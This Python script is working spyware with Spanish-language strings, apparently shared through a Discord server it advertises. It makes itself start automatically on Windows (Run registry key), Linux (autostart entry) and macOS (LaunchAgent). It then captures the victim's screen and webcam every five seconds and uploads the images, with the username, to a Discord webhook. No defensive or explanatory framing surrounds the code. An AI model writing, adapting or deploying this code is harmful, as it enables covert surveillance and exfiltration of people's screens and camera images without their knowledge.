import os
import time
import sys
import getpass
import platform
from discord_webhook import DiscordWebhook, DiscordEmbed
from PIL import ImageGrab, Image, ImageDraw

try:
    import cv2
except ImportError:
    cv2 = None

user = os.path.expanduser("~")
hook = "webhook" 
username = getpass.getuser()

def generar_imagen_error():
    img = Image.new("RGB", (640, 480), (0, 0, 0))
    dibujo = ImageDraw.Draw(img)
    texto = "No se encontró webcam"
    ancho, alto = dibujo.textsize(texto)
    dibujo.text(((640 - ancho) // 2, (480 - alto) // 2), texto, (255, 255, 255))
    return img

def configure_autostart():
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    try:
        if system == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, reg_path, 0, winreg.KEY_ALL_ACCESS) as registry_key:
                winreg.SetValueEx(registry_key, "ScreenshotMonitor", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        
        elif system == "Linux":
            autostart_dir = os.path.join(user, ".config", "autostart")
            desktop_file = os.path.join(autostart_dir, "screenshot_monitor.desktop")
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            
            content = f"""[Desktop Entry]
Type=Application
Exec={sys.executable} {script_path}
Hidden=false
NoDisplay=false
Name=Screenshot Monitor
Comment=Automated screenshot capture"""
            
            with open(desktop_file, "w") as f:
                f.write(content)
        
        elif system == "Darwin":
            plist_path = os.path.join(user, "Library", "LaunchAgents", "com.user.screenshotmonitor.plist")
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.screenshotmonitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            os.system(f"launchctl load {plist_path}")
    
    except Exception as e:
        print(f"Error configuring autostart: {e}")

if not getattr(sys, 'auto_start_configured', False):
    configure_autostart()
    sys.auto_start_configured = True

def screen():
    while True:
        sss = ImageGrab.grab()
        temp_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
        webcam_path = os.path.join(user, "AppData", "Local", "Temp", "webcam.png")
        sss.save(temp_path)

        if cv2:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                cap.release()
                if ret:
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    Image.fromarray(frame_rgb).save(webcam_path)
                else:
                    generar_imagen_error().save(webcam_path)
            else:
                generar_imagen_error().save(webcam_path)
        else:
            generar_imagen_error().save(webcam_path)

        webhook = DiscordWebhook(url=hook)
        with open(temp_path, "rb") as f:
            webhook.add_file(file=f.read(), filename="ss.png")
        with open(webcam_path, "rb") as f:
            webhook.add_file(file=f.read(), filename="webcam.png")

        embed = DiscordEmbed(
            title="🖥 Discord: https://discord.gg/MSukhfr6k3",
            description=f"Usuario: **{username}**\nNueva captura cada 5 segundos",
            color=0x2ECC71
        )
        embed.set_author(
            name="Screenshot Monitor",
            icon_url="https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
        )
        embed.set_image(url="attachment://ss.png")
        embed.set_thumbnail(url="attachment://webcam.png")
        embed.set_footer(text=f"🕒 {time.strftime('%d/%m/%Y %H:%M:%S')}")

        webhook.add_embed(embed)
        webhook.execute()

        try:
            os.remove(temp_path)
            os.remove(webcam_path)
        except Exception as e:
            print(f"Error eliminando archivos: {e}")

        time.sleep(5)

if __name__ == "__main__":
    screen()
